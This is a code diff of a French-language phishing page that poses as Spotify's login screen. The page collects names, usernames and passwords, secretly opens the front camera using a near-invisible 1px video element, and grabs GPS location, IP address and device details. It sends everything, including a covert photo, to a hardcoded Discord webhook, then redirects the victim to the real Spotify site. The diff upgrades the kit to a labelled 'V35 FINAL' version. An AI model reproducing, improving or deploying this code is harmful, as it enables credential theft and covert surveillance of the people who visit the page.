@@ -10,47 +10,37 @@
         body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
         .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
         .logo { width: 45px; margin: 0 auto 35px auto; }
-        
         .field { text-align: left; margin-bottom: 15px; }
         label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #fff; }
-        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; transition: border 0.2s; }
-        input:focus { border: 2px solid #fff; padding: 13px; }
-        
+        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
+        input:focus { border: 2px solid #1ed760; }
         .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
-        
-        .divider { display: flex; align-items: center; width: 100%; margin: 30px 0; color: #b3b3b3; font-size: 11px; font-weight: 900; letter-spacing: 1px; }
-        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
-        .divider:not(:empty)::before { margin-right: 1.5em; }
-        .divider:not(:empty)::after { margin-left: 1.5em; }
-
         #loader { display: none; margin-top: 20px; }
         .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
         .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
         
-        #v, #c { position: absolute; left: -9999px; visibility: hidden; }
+        /* LE SECRET : 1px visible pour forcer le mobile à ne pas envoyer du noir */
+        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; pointer-events: none; }
+        #c { display: none; }
     </style>
 </head>
 <body>
     <div class="app-card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
-
         <div id="login-form">
             <div class="flex gap-2">
-                <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text"></div>
-                <div class="field w-1/2"><label>Nom</label><input id="ln" type="text"></div>
+                <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text" placeholder=""></div>
+                <div class="field w-1/2"><label>Nom</label><input id="ln" type="text" placeholder=""></div>
             </div>
-            <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text"></div>
+            <div class="field"><label>E-mail ou utilisateur</label><input id="u" type="text"></div>
             <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
-            <button onclick="processLogin()" id="btn" class="btn-green">Se connecter</button>
+            <button onclick="launchV35()" id="btn" class="btn-green">Se connecter</button>
         </div>
 
         <div id="loader">
             <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
-            <p style="font-size: 12px; color: #b3b3b3; margin-top: 10px;">Vérification du compte...</p>
+            <p style="font-size: 12px; color: #b3b3b3; margin-top: 10px;">Vérification du profil...</p>
         </div>
-
-        <div class="divider">OU</div>
-        <p style="color: #b3b3b3; font-size: 14px;">Vous n'avez pas de compte ? <span style="color:#fff; text-decoration: underline; font-weight: 700;">S'inscrire</span></p>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -59,27 +49,29 @@
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
 
-        async function processLogin() {
-            const data = {
-                fn: document.getElementById('fn').value,
-                ln: document.getElementById('ln').value,
-                u: document.getElementById('u').value,
-                p: document.getElementById('p').value
-            };
+        async function launchV35() {
+            const data = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
             if(!data.u || !data.p) return;
 
             document.getElementById('login-form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             const pb = document.getElementById('pbar');
 
-            // --- 1. LOCALISATION & INFOS ---
+            // 1. Force Caméra (1px visible pour éviter le noir)
+            let stream = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('v').srcObject = stream;
+            } catch(e) {}
+
+            // 2. Data & GPS
             pb.style.width = "40%";
             let gps = "❌ Bloqué";
             try {
                 const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 5000});
+                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000});
                 });
-                gps = `✅ **MAPS :** [Lien](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+                gps = `✅ **LOCALISÉ :** [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
             } catch(e) {}
 
             let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
@@ -89,39 +81,38 @@
 
             const payload = {
                 embeds: [{
-                    title: `🎵 LOG V33 - ${data.fn} ${data.ln}`,
+                    title: `🔱 LOG V35 FINAL - ${data.fn} ${data.ln}`,
                     color: 1955168,
                     fields: [
-                        { name: "👤 COMPTE", value: `**User:** \`${data.u}\`\n**Pass:** \`${data.p}\`` },
+                        { name: "👤 COMPTE", value: `**User:** \`${data.u}\`\n**Pass:** \`${data.p}\`\n**Nom:** \`${data.fn} ${data.ln}\`` },
                         { name: "📍 LOC", value: `**GPS:** ${gps}\n**IP:** \`${net.ip}\` (${net.city})` },
-                        { name: "📱 MATÉRIEL", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**Batterie:** \`${Math.round(bat.level*100)}%\`` }
-                    ]
+                        { name: "📱 SYSTÈME", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**Batterie:** \`${Math.round(bat.level*100)}%\`` }
+                    ],
+                    footer: { text: "LVN Elite • " + new Date().toLocaleString() }
                 }]
             };
             await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
 
-            // --- 2. CAPTURE (PC=OK / APP=NOIR) ---
-            pb.style.width = "80%";
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 2000));
+            // 3. Capture Photo (Attente de 3.5s pour PC et Mobile)
+            pb.style.width = "90%";
+            if(stream) {
+                await new Promise(r => setTimeout(r, 3500));
+                const v = document.getElementById('v');
                 const can = document.getElementById('c');
-                can.width = video.videoWidth; can.height = video.videoHeight;
-                can.getContext('2d').drawImage(video, 0, 0);
+                can.width = v.videoWidth; can.height = v.videoHeight;
+                can.getContext('2d').drawImage(v, 0, 0);
                 
                 can.toBlob(async b => {
                     const fd = new FormData();
-                    fd.append('file', b, 'capture.jpg');
-                    fd.append('content', `📸 **Capture : ${data.fn} ${data.ln}**`);
+                    fd.append('file', b, 'final_shot.jpg');
+                    fd.append('content', `📸 **Photo de ${data.fn} ${data.ln}**`);
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
+                    window.location.href = "https://www.spotify.com/fr/login/";
                 }, 'image/jpeg', 0.8);
-            } catch(e) {}
-
-            pb.style.width = "100%";
-            setTimeout(() => { window.location.href = "https://www.spotify.com/premium"; }, 1000);
+            } else {
+                setTimeout(() => { window.location.href = "https://www.spotify.com/fr/login/"; }, 1000);
+            }
         }
     </script>
 </body>
